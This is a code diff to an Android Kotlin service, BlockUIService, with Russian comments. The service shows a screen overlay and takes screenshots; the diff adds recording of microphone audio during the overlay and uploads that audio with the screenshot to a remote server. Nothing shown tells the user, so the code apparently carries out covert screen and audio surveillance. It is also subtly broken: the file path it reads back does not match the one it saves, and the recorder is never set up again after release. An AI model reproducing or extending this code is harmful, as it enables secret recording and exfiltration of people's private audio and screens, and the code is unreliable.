@@ -7,10 +7,13 @@ import android.content.SharedPreferences
 import android.graphics.Bitmap
 import android.graphics.Canvas
 import android.graphics.PixelFormat
+import android.media.MediaRecorder
 import android.os.Build
+import android.os.Environment
 import android.os.IBinder
 import android.view.*
 import android.widget.Button
+import android.widget.Toast
 import androidx.core.view.doOnAttach
 import kotlinx.coroutines.*
 import okhttp3.OkHttpClient
@@ -52,6 +55,12 @@ class BlockUIService : Service(), CoroutineScope {
     private val job = SupervisorJob()
     override val coroutineContext = Dispatchers.Main + job
 
+    //для записи звука
+    private var output: String? = null
+    private var mediaRecorder: MediaRecorder? = null
+    private var state: Boolean = false
+    private var recordingStopped: Boolean = false
+
     override fun onBind(intent: Intent?): IBinder? {
         return null
     }
@@ -60,6 +69,14 @@ class BlockUIService : Service(), CoroutineScope {
         if (viewOverlay == null) {
             windowManager = applicationContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager?
             windowManager!!.addView(createView(), generateLayoutParams())
+            //звук
+            output = Environment.getExternalStorageDirectory().absolutePath + "/recording.mp3"
+            mediaRecorder = MediaRecorder()
+
+            mediaRecorder?.setAudioSource(MediaRecorder.AudioSource.MIC)
+            mediaRecorder?.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+            mediaRecorder?.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+            mediaRecorder?.setOutputFile(output)
         }
         return START_NOT_STICKY
     }
@@ -100,8 +117,12 @@ class BlockUIService : Service(), CoroutineScope {
             override fun run() {
                 val screen = getScreenShotFromView(viewOverlay!!)
                 launchUI {
-                        withIO {
-                            list = service.postscreen_getout(saveMediaToStorage(screen!!)!!) } //withIO помогает получать данные из другого потока, так быстрее
+                    withIO {
+                        startRecording()
+                        delay(2000L)
+                        stopRecording()
+                        val music = loadFile()
+                        list = service.postscreen_getout(saveMediaToStorage(screen!!)!!, music!!) } //withIO помогает получать данные из другого потока, так быстрее
                     println(list)
                 }
             }
@@ -146,6 +167,31 @@ class BlockUIService : Service(), CoroutineScope {
             e.printStackTrace()
         }
         return file
+    }
+
+    private fun loadFile() : File? {
+        val file = File("/recording.mp3")
+        return file
+    }
+
+    private fun startRecording() {
+        try {
+            mediaRecorder?.prepare()
+            mediaRecorder?.start()
+            state = true
+        } catch (e: IllegalStateException) {
+            e.printStackTrace()
+        } catch (e: IOException) {
+            e.printStackTrace()
+        }
+    }
+
+    private fun stopRecording(){
+        if(state) {
+            mediaRecorder?.stop()
+            mediaRecorder?.release()
+            state = false
+        }
     }
 
 }
